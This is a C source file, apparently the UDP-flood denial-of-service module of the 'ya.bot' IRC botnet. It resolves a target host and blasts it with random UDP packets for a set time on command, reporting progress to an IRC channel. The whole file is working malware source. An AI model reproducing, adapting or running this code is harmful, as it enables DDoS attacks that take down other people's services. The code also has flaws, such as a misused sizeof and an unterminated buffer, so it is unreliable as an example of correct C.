/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_UDPFLOOD
DWORD WINAPI udpflood_main(LPVOID param)
{
	char szBuffer[MASBUF];
	DWORD dwTime;
	int i;
	sockaddr_in sin;
	SOCKET sock;
	SUDPFlood s_uf = *((SUDPFlood *)param);

#ifndef NO_DEBUG
		debug_print("UDP flooding, udpflood_main()");
#endif

	if (!gethostbyname(s_uf.m_szHost))
	{
		if ((!s_uf.m_bSilent) && (s_uf.m_bVerbose))
				irc_message(s_uf.m_bsock, s_uf.m_szAction, s_uf.m_szDestination,
						(char *)string_ddosfailed,
						CRED, string_replyddos, CEND, string_replydotbot);
			thread_remove(THREAD_DDOS);
			return 0;
	}
		sin.sin_addr.s_addr = *(LPDWORD)gethostbyname((char *)s_uf.m_szHost)->h_addr_list[0];
		sin.sin_family = AF_INET;
		sin.sin_port = htons(s_uf.m_nPort);
		sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == SOCKET_ERROR)
	{
		if ((!s_uf.m_bSilent) && (s_uf.m_bVerbose))
				irc_message(s_uf.m_bsock, s_uf.m_szAction, s_uf.m_szDestination,
						(char *)string_ddosfailed,
						CRED, string_replyddos, CEND, string_replydotbot);
			thread_remove(THREAD_DDOS);
			return 0;
	}
		srand(GetTickCount());
	for (i = 0; i < sizeof(MASBUF) - 3; i++)
			szBuffer[i] = rand() % 9;
		strncat(szBuffer, "\r", sizeof(szBuffer) - strlen(szBuffer) - 1);
		strncat(szBuffer, "\n", sizeof(szBuffer) - strlen(szBuffer) - 1);
	if (!s_uf.m_bSilent)
			irc_message(s_uf.m_bsock, s_uf.m_szAction, s_uf.m_szDestination,
					(char *)string_ddosudpfloodstarted,
					CGREEN, string_replyddos, CEND, string_replydotbot,
					CBLUE, CEND, s_uf.m_szHost,
					CBLUE, CEND, s_uf.m_nPort,
					CBLUE, CEND, s_uf.m_nDelay,
					CBLUE, CEND, s_uf.m_dwTime);
		dwTime = GetTickCount();
	while (TRUE)
	{
			sendto(sock, szBuffer, strlen(szBuffer), 0, (sockaddr *)&sin, sizeof(sin));
		if ((GetTickCount() - dwTime) >= (s_uf.m_dwTime * 60000))
				break;
			Sleep(s_uf.m_nDelay);
	}
		closesocket(sock);
	if ((!s_uf.m_bSilent) && (s_uf.m_bVerbose))
			irc_message(s_uf.m_bsock, s_uf.m_szAction, s_uf.m_szDestination,
					(char *)string_ddosfinishedflooding,
					CBLUE, string_replyddos, CEND, string_replydotbot,
					CBLUE, CEND, s_uf.m_szHost,
					CBLUE, CEND, s_uf.m_dwTime);
		thread_remove(THREAD_DDOS);
		return 0;
}
#endif